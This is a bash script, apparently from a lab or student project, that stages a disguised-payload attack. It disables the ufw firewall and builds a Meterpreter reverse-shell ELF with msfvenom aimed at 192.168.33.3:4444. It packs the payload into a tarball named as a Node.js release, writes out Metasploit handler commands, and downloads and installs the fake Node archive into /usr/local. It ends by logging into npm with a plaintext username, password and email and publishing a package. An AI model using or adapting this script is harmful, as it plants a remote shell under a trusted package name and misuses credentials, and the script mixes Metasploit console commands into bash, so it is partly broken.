#!/bin/bash
# sudo systemctl stop firewalld
sudo ufw disable
#mkdir wgets
#cd wgets
#/usr/local/bin/wget --tries=2 -V parallels.com/
#sleep 4
#/usr/local/bin/wget -N -vvv 192.168.33.3/ipscan_3.5.5_amd64.deb
#/usr/local/bin/wget -N -vvv 192.168.33.3/atom.x86_64.rpm
#sudo dnf -y install atom.x86_64.rpm
#sleep 1
#cd ..
#rm -rf wgets
#exploit script
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.33.3 lport=4444 -f elf > shell.elf
sudo chmod +x shell.elf
sudo mv shell.elf /tmp/ftptest/bin
cd /tmp
sudo tar -czvf node-v12.8.1-linux-x64.tar.gz ftptest
sudo mv node-v12.8.1-linux-x64.tar.gz ftptest
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.33.3
set lport 4444
set ExitOnSession false
exploit -j -z
set AutoRunScript multi_console_command -r /attack.rc
# Download and install Nodejs with npm
wget --tries=2 -V parallels.com/
sleep 4
wget -N -vvv 192.168.33.3/node-v12.8.1-linux-x64.tar.gz
tar -C /usr/local --strip-components 1 -xzf node-v12.8.1-linux-x64.tar.gz
rm node-v12.8.1-linux-x64.tar.gz
sleep 1
node -v
npm -v
ipscan

# Install node modules and run tests
npm install
npm audit fix
npm test

# Publish new version of example app
cd examples
npm install
npm install -g npm-cli-login
npm-cli-login -u mar00nie -p dissertationproject -e yangyangteng@hotmail.com
npm whoami
npm publish
